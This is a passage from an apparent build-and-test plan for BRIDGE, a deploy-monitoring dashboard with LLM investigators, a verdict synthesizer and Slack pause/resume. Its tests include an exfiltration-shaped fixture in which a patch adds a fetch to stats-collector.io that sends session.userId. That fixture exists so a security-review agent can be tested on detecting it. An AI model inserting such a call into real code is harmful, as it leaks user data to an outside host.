#### T3.1.3 — Wire StatusBlock + Timeline + Feed + ThreatPanel to SSE

**Description:** In `page.tsx`, replace the `useDemo` mock with `useDeploysSSE` (when `mode='live'`). The StatusBlock state, deploy list, feed entries, and threat list now come from SSE events. AgentsPanel and HeatmapPanel stay on mock until T4 (agents) and T7 (heatmap).

**Requires:** T3.1.2

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json && npx next build
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/(warroom)/page.tsx app/(warroom)/components/StatusBlock.tsx app/(warroom)/components/TimelineRow.tsx app/(warroom)/components/FeedPanel.tsx app/(warroom)/components/ThreatPanel.tsx"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('react-dom/server').then(async ({ renderToString }) => { const React = (await import('react')).default; const mod = await import('./app/(warroom)/page.tsx'); const Page = mod.default; if (!Page) { console.error('page.tsx default export missing'); process.exit(1); } const html = renderToString(React.createElement(Page)); if (!html.includes('BRIDGE')) { console.error('page render missing BRIDGE banner'); process.exit(1); } console.log('OK page renders'); })"
```

```bash
# tier4_integration
(npx next dev -p 3030 > /tmp/dev-t313.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done && SHA=live_$(date +%s) && npx tsx --input-type=module -e "import('./lib/db.ts').then(async ({ setDeploy }) => { require('dotenv').config({path:'.env.local'}); await setDeploy('$SHA', { sha: '$SHA', score: 0.92, tldr: 'live wire test', author: 'dev-3', pushed_at: new Date().toISOString(), files_changed: ['lib/auth.ts'] }); })" && sleep 3 && curl -fsS 'http://localhost:3030/api/stream/deploys' --max-time 4 -N | head -c 1000 | grep -q "$SHA"; ec=$?; pkill -f 'next dev.*3030' || true; npx tsx --input-type=module -e "import('./lib/db.ts').then(async ({ kv }) => { require('dotenv').config({path:'.env.local'}); await kv.del('deploys:$SHA'); })" || true; exit $ec
```

---

## T4 — Investigators + Synthesizer

**Description:** A high-score push (≥0.6) triggers visible parallel agent activity ending in a verdict.

### T4.1 — Investigator base + DurableAgent wiring

#### T4.1.1 — `workflows/investigators/_base.ts`

**Description:** Shared types and helpers for investigators. Define `InvestigatorInput`, `InvestigatorFinding`, an `emitInvestigatorEvent(deploy_id, agent, status, current_action?, finding?)` helper that writes to SSE-readable KV keys: `investigator:{deploy_id}:{agent}` (current state).

**Requires:** T3.1.3

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: workflows/investigators/_base.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./workflows/investigators/_base.ts').then(async ({ emitInvestigatorEvent }) => { import('./lib/db.ts').then(async ({ kv }) => { require('dotenv').config({path:'.env.local'}); await emitInvestigatorEvent('test_dep', 'history', 'investigating', 'querying...'); const got = JSON.parse(await kv.get('investigator:test_dep:history') || '{}'); if (got.status !== 'investigating') { console.error('event not persisted', got); process.exit(1); } await kv.del('investigator:test_dep:history'); console.log('OK'); }); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./workflows/investigators/_base.ts').then((m) => { if (typeof m.emitInvestigatorEvent !== 'function') { console.error('emit helper missing'); process.exit(1); } console.log('OK'); })"
```

### T4.2 — Live investigators (3)

#### T4.2.1 — History Inspector

**Description:** `workflows/investigators/history.ts` — DurableAgent. Queries KV history for: prior commits by author to this path (`history:author:{login}`), hour-of-day for this file (`history:hour:{path}`), co-change pairs. LLM step (claude-sonnet-4-6 via AI Gateway) writes a 1-sentence finding. Streams `current_action` events along the way.

**Requires:** T4.1.1

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: workflows/investigators/history.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./workflows/investigators/history.ts').then(async ({ historyInvestigator }) => { import('./lib/db.ts').then(async ({ kv }) => { require('dotenv').config({path:'.env.local'}); await kv.set('history:author:dev-3', JSON.stringify(['components/ui'])); const r = await historyInvestigator({ deploy_id: 'h_test', sha: 'abc', author: 'dev-3', files: [{ path: 'lib/auth.ts' }] }); if (!r.finding) { console.error('no finding', r); process.exit(1); } if (r.finding.severity !== 'critical' && r.finding.severity !== 'high') { console.error('expected high/critical for novel-area dev-3', r); process.exit(1); } await kv.del('history:author:dev-3'); console.log('OK ' + r.finding.summary.slice(0, 80)); }); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./workflows/investigators/history.ts').then(async ({ historyInvestigator }) => { import('./lib/db.ts').then(async ({ kv }) => { require('dotenv').config({path:'.env.local'}); const r = await historyInvestigator({ deploy_id: 'hi_int', sha: 'abc', author: 'familiar-author', files: [{ path: 'lib/x.ts' }] }); const evt = JSON.parse(await kv.get('investigator:hi_int:history') || '{}'); if (evt.status !== 'complete') { console.error('investigator did not finalize', evt); process.exit(1); } await kv.del('investigator:hi_int:history'); console.log('OK e2e'); }); })"
```

#### T4.2.2 — Dependency Inspector

**Description:** `workflows/investigators/dependency.ts` — DurableAgent. If `package-lock.json` changed: runs `npm audit --json` in Vercel Sandbox. Checks new deps against npm metadata for typosquat signals (low download count <100/wk, recent publish <30d). LLM step writes finding.

**Requires:** T4.2.1

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: workflows/investigators/dependency.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./workflows/investigators/dependency.ts').then(async ({ dependencyInvestigator }) => { require('dotenv').config({path:'.env.local'}); const r = await dependencyInvestigator({ deploy_id: 'dep_test', sha: 'abc', files: [{ path: 'lib/x.ts' }] }); if (r.finding && r.finding.severity !== 'low') { console.error('no-package.json change should yield low severity', r.finding); process.exit(1); } console.log('OK no-pkg-change'); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./workflows/investigators/dependency.ts').then(async ({ dependencyInvestigator }) => { require('dotenv').config({path:'.env.local'}); const r = await dependencyInvestigator({ deploy_id: 'dep_int', sha: 'abc', files: [{ path: 'package.json', patch: '+    \\\"left-pad\\\": \\\"^1.0.0\\\"' }, { path: 'package-lock.json', patch: '+...' }] }); if (!r.finding) { console.error('no finding on real pkg change'); process.exit(1); } console.log('OK ' + r.finding.summary.slice(0, 80)); })"
```

#### T4.2.3 — Diff Inspector

**Description:** `workflows/investigators/diff.ts` — DurableAgent. Pure LLM-driven security review of the patch. Prompt: "Review this diff for security concerns: hardcoded URLs, eval/exec, auth bypass shapes, error swallowing. Respond with JSON: { severity, summary, evidence_lines }".

**Requires:** T4.2.2

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: workflows/investigators/diff.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./workflows/investigators/diff.ts').then(async ({ diffInvestigator }) => { require('dotenv').config({path:'.env.local'}); const r = await diffInvestigator({ deploy_id: 'diff_test', sha: 'abc', files: [{ path: 'lib/auth.ts', patch: '+await fetch(\\'https://stats-collector.io/track\\', { method: \\'POST\\', body: JSON.stringify({ user: session.userId }) })' }] }); if (!r.finding || r.finding.severity === 'low') { console.error('expected medium/high/critical on exfil shape', r); process.exit(1); } console.log('OK ' + r.finding.severity + ': ' + r.finding.summary.slice(0, 80)); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./workflows/investigators/diff.ts').then(async ({ diffInvestigator }) => { require('dotenv').config({path:'.env.local'}); const r = await diffInvestigator({ deploy_id: 'diff_int', sha: 'abc', files: [{ path: 'README.md', patch: '+## Hello' }] }); if (!r.finding || r.finding.severity !== 'low') { console.error('expected low on innocuous change', r); process.exit(1); } console.log('OK low'); })"
```

### T4.3 — Stub investigators (trace, runtime)

#### T4.3.1 — Trace + Runtime stub investigators with mode flag

**Description:** Both `workflows/investigators/trace.ts` and `workflows/investigators/runtime.ts` exist. In `mode='production'`, they emit `status='idle'` with finding `{ severity: 'low', summary: 'N/A — no observability source connected' }`. In `mode='demo'`, they emit synthesized events matching war-room/app.jsx's streams (TRACE: 3 lines about OTLP queries, finishes "low" with "No new error patterns"; RUNTIME: 3 lines about metrics, finishes "medium" with "No runtime anomalies yet"). Mode is read from env `BRIDGE_MODE` (default `production`).

**Requires:** T4.2.3

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: workflows/investigators/trace.ts workflows/investigators/runtime.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "Promise.all([import('./workflows/investigators/trace.ts'), import('./workflows/investigators/runtime.ts')]).then(async ([{ traceInvestigator }, { runtimeInvestigator }]) => { process.env.BRIDGE_MODE = 'production'; const tp = await traceInvestigator({ deploy_id: 'mp', sha: 'a', files: [] }); if (!tp.finding.summary.includes('N/A')) { console.error('production should be N/A', tp); process.exit(1); } process.env.BRIDGE_MODE = 'demo'; const td = await traceInvestigator({ deploy_id: 'md', sha: 'a', files: [] }); if (td.finding.summary.includes('N/A')) { console.error('demo should produce real-looking finding', td); process.exit(1); } console.log('OK'); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./workflows/investigators/trace.ts').then(async ({ traceInvestigator }) => { import('./lib/db.ts').then(async ({ kv }) => { require('dotenv').config({path:'.env.local'}); process.env.BRIDGE_MODE = 'demo'; const r = await traceInvestigator({ deploy_id: 't_int', sha: 'a', files: [] }); const evt = JSON.parse(await kv.get('investigator:t_int:trace') || '{}'); if (evt.status !== 'complete') { console.error('demo trace did not finalize', evt); process.exit(1); } await kv.del('investigator:t_int:trace'); console.log('OK ' + evt.finding?.summary?.slice(0, 60)); }); })"
```

### T4.4 — Dispatch + Synthesizer

#### T4.4.1 — Dispatch from `watchdog.ts`

**Description:** After scoring, watchdog dispatches investigators in parallel via `Promise.all`. The set dispatched depends on score AND mode:

| `BRIDGE_MODE` | score < 0.6 | score ∈ [0.6, ∞) |
|---|---|---|
| `production` | 0 dispatched | 3 dispatched (history, dependency, diff) — trace + runtime show N/A |
| `demo` | 0 dispatched | 5 dispatched (all, including synthesized trace + runtime streams) |

Each investigator is a separate sub-workflow (WDK handles durability + retries per sub-workflow). Watchdog awaits all findings via `Promise.all` (NOT `Promise.allSettled` — a failed investigator throws, WDK retries it). The dispatch threshold (0.6) is configurable via `DISPATCH_THRESHOLD` env (default 0.6); validate range [0,1].

**Requires:** T4.3.1

**Verify:**

```bash
# tier1_build
npx tsc --noEmit --strict -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: workflows/watchdog.ts"
```

```bash
# tier3_unit
# 7 cases: score-threshold × mode matrix + boundary + parallelism + idempotence
npx tsx --input-type=module -e "
import { watchdog } from './workflows/watchdog.ts';
import { kv } from './lib/db.ts';
import 'dotenv/config';

async function dispatchKeys(sha) {
  return await kv.list('investigator:' + sha + ':');
}
async function cleanup(sha) {
  for (const k of await kv.list('investigator:' + sha + ':')) await kv.del(k);
  await kv.del('deploys:' + sha);
}

const cases = [
  // 1. demo + high score → 5 investigators
  { name: 'demo + 0.91 → 5 investigators', mode: 'demo', score: 0.91, expectKeys: 5 },
  // 2. demo + low score → 0 investigators
  { name: 'demo + 0.10 → 0 investigators', mode: 'demo', score: 0.10, expectKeys: 0 },
  // 3. production + high score → 3 investigators (no trace, no runtime)
  { name: 'production + 0.91 → 3 (no trace/runtime)', mode: 'production', score: 0.91, expectKeys: 3, noKeysContaining: ['trace','runtime'] },
  // 4. production + low score → 0 investigators
  { name: 'production + 0.10 → 0 investigators', mode: 'production', score: 0.10, expectKeys: 0 },
  // 5. boundary: score = exactly 0.6 must dispatch (threshold is >=)
  { name: 'demo + 0.6 (boundary, inclusive) → 5', mode: 'demo', score: 0.6, expectKeys: 5 },
  // 6. boundary: score = 0.5999 must NOT dispatch
  { name: 'demo + 0.5999 (just below) → 0', mode: 'demo', score: 0.5999, expectKeys: 0 },
];

for (const c of cases) {
  process.env.BRIDGE_MODE = c.mode;
  const sha = 't441_' + c.mode + '_' + Math.floor(c.score * 100) + '_' + Date.now().toString(36);
  await watchdog({ sha, repo: 'octocat/Hello-World', before: '0', after: '7fd1a60b01f91b314f59955a4e4d4e80d8edf11d', _force_score: c.score }).catch(() => {});
  const keys = await dispatchKeys(sha);
  if (keys.length !== c.expectKeys) { console.error('FAIL', c.name, 'expected', c.expectKeys, 'got', keys.length, keys); await cleanup(sha); process.exit(1); }
  if (c.noKeysContaining) {
    for (const forbidden of c.noKeysContaining) {
      if (keys.some(k => k.endsWith(':' + forbidden))) { console.error('FAIL', c.name, 'should not contain', forbidden, 'in', keys); await cleanup(sha); process.exit(1); }
    }
  }
  await cleanup(sha);
}

// 7. Idempotence: dispatching watchdog twice for the same sha → KV state is overwrites, not duplicates
process.env.BRIDGE_MODE = 'demo';
const idemSha = 't441_idem_' + Date.now().toString(36);
await watchdog({ sha: idemSha, repo: 'octocat/Hello-World', before: '0', after: '7fd1a60b01f91b314f59955a4e4d4e80d8edf11d', _force_score: 0.91 }).catch(() => {});
const keys1 = (await dispatchKeys(idemSha)).length;
await watchdog({ sha: idemSha, repo: 'octocat/Hello-World', before: '0', after: '7fd1a60b01f91b314f59955a4e4d4e80d8edf11d', _force_score: 0.91 }).catch(() => {});
const keys2 = (await dispatchKeys(idemSha)).length;
if (keys1 !== keys2) { console.error('idempotence FAIL', keys1, keys2); await cleanup(idemSha); process.exit(1); }
await cleanup(idemSha);

console.log('OK ' + cases.length + ' threshold/mode cases + idempotence');
"
```

```bash
# tier4_integration
# Cross-stage: real fan-out completes, all investigator records show 'complete' status, parallelism is real (not serial).
npx tsx --input-type=module -e "
import { watchdog } from './workflows/watchdog.ts';
import { kv } from './lib/db.ts';
import 'dotenv/config';

process.env.BRIDGE_MODE = 'demo';
const sha = 't441_e2e_' + Date.now().toString(36);

// (a) Parallelism: time the dispatch — 5 investigators in parallel should complete in roughly the time of the slowest, not 5×.
const t0 = Date.now();
await watchdog({ sha, repo: 'octocat/Hello-World', before: '0', after: '7fd1a60b01f91b314f59955a4e4d4e80d8edf11d', _force_score: 0.91 });
const elapsed = Date.now() - t0;
// Each demo-mode investigator takes ~3-7s. If serial, 5 would take ~25-35s. If parallel, ~7s. Cap at 18s for slack.
if (elapsed > 18000) { console.error('dispatch took', elapsed, 'ms — likely serial, not parallel'); process.exit(1); }

// (b) All investigators reached 'complete' status
const keys = await kv.list('investigator:' + sha + ':');
if (keys.length !== 5) { console.error('expected 5 investigator records, got', keys.length); process.exit(1); }
for (const k of keys) {
  const rec = JSON.parse(await kv.get(k));
  if (rec.status !== 'complete') { console.error('investigator not complete:', k, rec.status); process.exit(1); }
  if (!rec.finding) { console.error('investigator has no finding:', k); process.exit(1); }
}

// (c) Failure-mode: if one investigator throws, watchdog still produces a watchdog-level error AND the others' findings are persisted (proved by KV state inspection).
//   Since WDK retries on throw, a forced-failure test requires _force_failure marker. Verify watchdog's error path mentions which agent failed.
const failSha = 't441_fail_' + Date.now().toString(36);
process.env.BRIDGE_MODE = 'demo';
let failureErr = null;
try {
  await watchdog({ sha: failSha, repo: 'octocat/Hello-World', before: '0', after: '7fd1a60b01f91b314f59955a4e4d4e80d8edf11d', _force_score: 0.91, _force_failure: 'history' });
} catch (e) { failureErr = e; }
if (!failureErr || !String(failureErr.message).toLowerCase().includes('history')) { console.error('expected error mentioning failed investigator name', failureErr); process.exit(1); }

// cleanup
for (const sha2 of [sha, failSha]) {
  for (const k of await kv.list('investigator:' + sha2 + ':')) await kv.del(k);
  await kv.del('deploys:' + sha2);
}

console.log('OK parallel(' + elapsed + 'ms < 18000) · all 5 complete · failure surface named');
"
```

#### T4.4.2 — `workflows/synthesizer.ts`

**Description:** `DurableAgent`. Takes `{ deploy_id, findings: InvestigatorFinding[], signals, score }`. LLM call (AI Gateway, `anthropic/claude-sonnet-4-6`, `temperature=0`) with a strict JSON schema in the prompt:

> Collapse these inspector findings into a single verdict. Inputs: findings (each: agent, severity, summary), signals (which detectors fired), score (0–1). Output **only valid JSON** matching: `{ level: "benign|watch|investigate|critical", summary: string, concerns: string[3..6], suggested_action: string }`. The level MUST escalate when any finding is "critical". The summary is one sentence. Concerns are 3 to 6 short bullets, each tied to evidence.

LLM output is parsed with `JSON.parse` inside try/catch — on parse failure, retry once with `temperature=0` (idempotent retry); on second failure, fall back to a deterministic `derivedVerdict({ findings, signals, score })` that picks `level` from the highest finding severity. Persists to `verdicts:{deploy_id}` with a timestamp.

**Requires:** T4.4.1

**Verify:**

```bash
# tier1_build
npx tsc --noEmit --strict -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: workflows/synthesizer.ts"
```

```bash
# tier3_unit
# Test the deterministic fallback (no LLM dependency) + JSON parsing helpers + level escalation logic.
npx tsx --input-type=module -e "
import { derivedVerdict, parseLLMVerdict, escalateLevel } from './workflows/synthesizer.ts';

// derivedVerdict: 5 cases covering severity ladder
const cases = [
  { name: 'all critical → critical', findings: [{ agent: 'history', severity: 'critical', summary: 'h' }, { agent: 'diff', severity: 'critical', summary: 'd' }], score: 0.91, expectLevel: 'critical' },
  { name: 'one critical → critical (escalation)', findings: [{ agent: 'diff', severity: 'critical', summary: 'd' }, { agent: 'dependency', severity: 'low', summary: 'l' }], score: 0.85, expectLevel: 'critical' },
  { name: 'highest is high → investigate', findings: [{ agent: 'history', severity: 'high', summary: 'h' }], score: 0.7, expectLevel: 'investigate' },
  { name: 'medium spread → watch', findings: [{ agent: 'history', severity: 'medium', summary: 'h' }, { agent: 'diff', severity: 'low', summary: 'd' }], score: 0.45, expectLevel: 'watch' },
  { name: 'all low → benign', findings: [{ agent: 'diff', severity: 'low', summary: 'd' }, { agent: 'history', severity: 'low', summary: 'h' }], score: 0.15, expectLevel: 'benign' },
  { name: 'edge: empty findings → benign + score-only', findings: [], score: 0.0, expectLevel: 'benign' },
  { name: 'edge: missing severity field tolerated → defaults to low', findings: [{ agent: 'history', summary: 'no sev' }], score: 0.2, expectLevel: 'benign' },
  { name: 'edge: score overrides — critical score floor regardless of low findings', findings: [{ agent: 'diff', severity: 'low', summary: 'l' }], score: 0.95, expectLevel: 'investigate' },
];
for (const c of cases) {
  const v = derivedVerdict({ findings: c.findings, signals: {}, score: c.score });
  if (v.level !== c.expectLevel) { console.error('FAIL', c.name, 'expected', c.expectLevel, 'got', v.level); process.exit(1); }
  if (!v.summary || typeof v.summary !== 'string') { console.error('FAIL summary on', c.name); process.exit(1); }
  if (!Array.isArray(v.concerns)) { console.error('FAIL concerns on', c.name); process.exit(1); }
  if (typeof v.suggested_action !== 'string') { console.error('FAIL suggested_action on', c.name); process.exit(1); }
}

// parseLLMVerdict: 6 cases covering JSON corner cases the LLM might emit
const parseCases = [
  { name: 'clean JSON', input: '{\"level\":\"critical\",\"summary\":\"s\",\"concerns\":[\"a\",\"b\",\"c\"],\"suggested_action\":\"act\"}', expectLevel: 'critical' },
  { name: 'JSON wrapped in markdown fence', input: '\\\`\\\`\\\`json\\n{\"level\":\"watch\",\"summary\":\"s\",\"concerns\":[\"a\",\"b\",\"c\"],\"suggested_action\":\"act\"}\\n\\\`\\\`\\\`', expectLevel: 'watch' },
  { name: 'JSON with trailing prose', input: '{\"level\":\"critical\",\"summary\":\"s\",\"concerns\":[\"a\",\"b\",\"c\"],\"suggested_action\":\"act\"}\\n\\nNote: this is high confidence.', expectLevel: 'critical' },
  { name: 'malformed JSON returns null', input: '{level: critical, broken', expect: null },
  { name: 'wrong-shape JSON returns null', input: '{\"foo\":\"bar\"}', expect: null },
  { name: 'unknown level returns null', input: '{\"level\":\"red\",\"summary\":\"s\",\"concerns\":[\"a\",\"b\",\"c\"],\"suggested_action\":\"act\"}', expect: null },
];
for (const c of parseCases) {
  const r = parseLLMVerdict(c.input);
  if ('expect' in c && c.expect === null) {
    if (r !== null) { console.error('FAIL parse', c.name, 'expected null, got', r); process.exit(1); }
  } else {
    if (!r || r.level !== c.expectLevel) { console.error('FAIL parse', c.name, 'expected level', c.expectLevel, 'got', r); process.exit(1); }
  }
}

// escalateLevel: any finding severity 'critical' must produce level 'critical'
if (escalateLevel('watch', 'critical') !== 'critical') { console.error('escalateLevel watch+critical → ?'); process.exit(1); }
if (escalateLevel('critical', 'low') !== 'critical') { console.error('escalateLevel cannot deescalate'); process.exit(1); }

console.log('OK ' + cases.length + ' derived cases · ' + parseCases.length + ' parse cases · escalation');
"
```

```bash
# tier4_integration
# Real LLM via AI Gateway — synthesize a critical scenario, verify it persists, then check determinism via temperature=0.
npx tsx --input-type=module -e "
import { synthesize } from './workflows/synthesizer.ts';
import { kv } from './lib/db.ts';
import 'dotenv/config';

const sha = 't442_' + Date.now().toString(36);
const findings = [
  { agent: 'history', severity: 'critical', summary: 'Author dev-3 (14d tenure) has zero prior commits to lib/auth/* and is not in CODEOWNERS for this path.' },
  { agent: 'diff',    severity: 'critical', summary: 'New external fetch() to stats-collector.io injected at lib/auth.ts:247 — not in allowlist; body exfiltrates session.userId.' },
  { agent: 'dependency', severity: 'low', summary: 'No new dependencies. Lockfile integrity clean.' },
  { agent: 'trace',   severity: 'low',  summary: 'No new error patterns. Trace topology matches 7d baseline.' },
  { agent: 'runtime', severity: 'medium', summary: 'No runtime anomalies in last 4 minutes — window may be too short.' },
];
const signals = { auth_path: true, external_fetch: true, off_hours: true, novel_author: true, critical_path: true };

// (1) Real LLM call → must produce critical verdict
const v = await synthesize({ deploy_id: sha, findings, signals, score: 0.91 });
if (v.level !== 'critical') { console.error('expected critical, got', v.level, '— LLM returned:', v); process.exit(1); }
if (!Array.isArray(v.concerns) || v.concerns.length < 3 || v.concerns.length > 6) { console.error('concerns count out of band [3,6]:', v.concerns); process.exit(1); }
if (typeof v.suggested_action !== 'string' || v.suggested_action.length < 10) { console.error('weak suggested_action:', v.suggested_action); process.exit(1); }
if (!v.concerns.some(c => c.toLowerCase().includes('stats-collector') || c.toLowerCase().includes('exfil') || c.toLowerCase().includes('fetch'))) {
  console.error('concerns do not mention the headline finding (exfil/stats-collector/fetch):', v.concerns); process.exit(1);
}

// (2) Persistence: verdicts:{sha} written
const persisted = JSON.parse(await kv.get('verdicts:' + sha) || '{}');
if (persisted.level !== v.level) { console.error('not persisted', persisted); process.exit(1); }
if (!persisted.synthesized_at || isNaN(Date.parse(persisted.synthesized_at))) { console.error('missing/invalid synthesized_at timestamp', persisted); process.exit(1); }

// (3) Idempotence at temperature=0: a second synthesize call returns the SAME level (LLM may vary text but level must stick).
const v2 = await synthesize({ deploy_id: sha + '_b', findings, signals, score: 0.91 });
if (v2.level !== v.level) { console.error('non-deterministic level across temp=0 calls', v.level, 'vs', v2.level); process.exit(1); }

// (4) Failure-mode: malformed findings (missing severity) must not crash, must produce a valid verdict via fallback
const v3 = await synthesize({ deploy_id: sha + '_c', findings: [{ agent: 'history' }, { agent: 'diff', summary: 'noop' }], signals: {}, score: 0.05 });
if (!v3.level) { console.error('synthesizer crashed on malformed findings'); process.exit(1); }

// cleanup
await kv.del('verdicts:' + sha);
await kv.del('verdicts:' + sha + '_b');
await kv.del('verdicts:' + sha + '_c');

console.log('OK live LLM=' + v.level + ' · ' + v.concerns.length + ' concerns · idempotent · degrades on malformed');
"
```

#### T4.4.3 — Wire investigator cards + verdict modal to live SSE

**Description:** Update SSE endpoint (T1.3.1) to also emit `investigator` and `verdict` events. Update `useDeploysSSE` reducer (T3.1.2) to handle them. AgentsPanel now renders live agent state from SSE; VerdictModal opens when a `verdict` event arrives for the active deploy.

**Requires:** T4.4.2

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json && npx next build
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/api/stream/deploys/route.ts app/(warroom)/hooks/useDeploysSSE.ts app/(warroom)/components/AgentsPanel.tsx app/(warroom)/components/VerdictModal.tsx"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./app/(warroom)/hooks/useDeploysSSE.ts').then((m) => { const initial = m.initialState; const after = m.reducer(initial, { type: 'investigator', deploy_id: 'd1', agent: 'history', status: 'investigating', current_action: 'querying' }); if (after.agents?.history?.status !== 'investigating') { console.error('reducer did not handle investigator event', after); process.exit(1); } const v = m.reducer(after, { type: 'verdict', deploy_id: 'd1', level: 'critical', summary: 's', concerns: ['c1'], suggested_action: 'a' }); if (v.verdict?.level !== 'critical') { console.error('reducer did not handle verdict', v); process.exit(1); } console.log('OK'); })"
```

```bash
# tier4_integration
(npx next dev -p 3030 > /tmp/dev-t443.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done && DID="d_e2e_$(date +%s)" && (timeout 8 curl -fsS -N "http://localhost:3030/api/stream/deploys" > /tmp/sse-e2e.txt &) && sleep 1 && npx tsx --input-type=module -e "import('./workflows/investigators/_base.ts').then(async ({ emitInvestigatorEvent }) => { require('dotenv').config({path:'.env.local'}); await emitInvestigatorEvent('$DID', 'history', 'investigating', 'live test'); })" && sleep 4 && grep -q "$DID" /tmp/sse-e2e.txt; ec=$?; pkill -f 'next dev.*3030' || true; npx tsx --input-type=module -e "import('./lib/db.ts').then(async ({ kv }) => { require('dotenv').config({path:'.env.local'}); await kv.del('investigator:$DID:history'); })" || true; exit $ec
```

---

## T5 — Slack Page + Human-in-the-Loop Pause

**Description:** The WDK money shot — workflow pauses for human input via Slack, resumes on click. This is the headline durability moment for the live demo.

### T5.1 — Slack pause/resume end-to-end

#### T5.1.1 — Create Slack app + env vars

**Description:** Create a Slack app at api.slack.com. Bot token scopes: `chat:write`, `reactions:write`, `chat:write.public`. Get bot token (`SLACK_BOT_TOKEN`), signing secret (`SLACK_SIGNING_SECRET`). Hardcode single channel id (`SLACK_CHANNEL_ID`). Add to Vercel env + `.env.local`. Install app to workspace.

**Requires:** T4.4.3

**Verify:**

```bash
# tier1_build
# Exception: env-var-only stage — no buildable artifact. Validates env shape as a proxy for "build correctness".
node -e "require('dotenv').config({path:'.env.local'}); ['SLACK_BOT_TOKEN','SLACK_SIGNING_SECRET','SLACK_CHANNEL_ID'].forEach(k => { if (!process.env[k]) { console.error('missing ' + k); process.exit(1); } }); if (!process.env.SLACK_BOT_TOKEN.startsWith('xoxb-')) { console.error('SLACK_BOT_TOKEN wrong prefix'); process.exit(1); } console.log('OK')"
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: .env.local (verify shape only — do not log secrets)"
```

```bash
# tier3_unit
node -e "require('dotenv').config({path:'.env.local'}); if (!process.env.SLACK_BOT_TOKEN.startsWith('xoxb-')) { console.error('bot token shape wrong'); process.exit(1); } if (process.env.SLACK_SIGNING_SECRET.length < 16) { console.error('signing secret too short'); process.exit(1); } if (!/^C[A-Z0-9]{8,}$/.test(process.env.SLACK_CHANNEL_ID)) { console.error('channel id shape wrong'); process.exit(1); } console.log('OK')"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('@slack/web-api').then(async ({ WebClient }) => { require('dotenv').config({path:'.env.local'}); const c = new WebClient(process.env.SLACK_BOT_TOKEN); const r = await c.auth.test(); if (!r.ok) { console.error('auth.test failed', r); process.exit(1); } console.log('OK ' + r.team + '/' + r.user); })"
```

#### T5.1.2 — `lib/slack.ts` helpers

**Description:** Export `postMessage(channel, text)`, `postBlocks(channel, blocks, metadata)`, `addReaction(channel, ts, name)`, `verifySigningSecret(body, headers)`. The verify helper computes `v0=` HMAC and compares to `X-Slack-Signature`.

**Requires:** T5.1.1

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: lib/slack.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./lib/slack.ts').then(({ verifySigningSecret }) => { const body = 'test=body'; const ts = Math.floor(Date.now()/1000).toString(); const crypto = require('crypto'); process.env.SLACK_SIGNING_SECRET = 'TEST'; const sig = 'v0=' + crypto.createHmac('sha256', 'TEST').update('v0:' + ts + ':' + body).digest('hex'); if (!verifySigningSecret(body, { 'x-slack-request-timestamp': ts, 'x-slack-signature': sig })) { console.error('valid sig rejected'); process.exit(1); } if (verifySigningSecret(body, { 'x-slack-request-timestamp': ts, 'x-slack-signature': 'v0=deadbeef' })) { console.error('bad sig accepted'); process.exit(1); } console.log('OK'); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./lib/slack.ts').then(async ({ postMessage }) => { require('dotenv').config({path:'.env.local'}); const r = await postMessage(process.env.SLACK_CHANNEL_ID, 'bridge spec test ' + Date.now()); if (!r.ok) { console.error('postMessage failed', r); process.exit(1); } console.log('OK ts=' + r.ts); })"
```

#### T5.1.3 — Block Kit page message in `watchdog.ts`

**Description:** After Synthesizer returns `level='critical'`, watchdog calls `postBlocks` with a Block Kit message: header (TL;DR), section (top 3 concerns), section (suggested action), action buttons (`Acknowledge` value=`ack:{deploy_id}`, `Hold Rollback` value=`hold:{deploy_id}`). Metadata includes `deploy_id`.

**Requires:** T5.1.2

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: workflows/watchdog.ts lib/slack.ts"
```

```bash
# tier3_unit
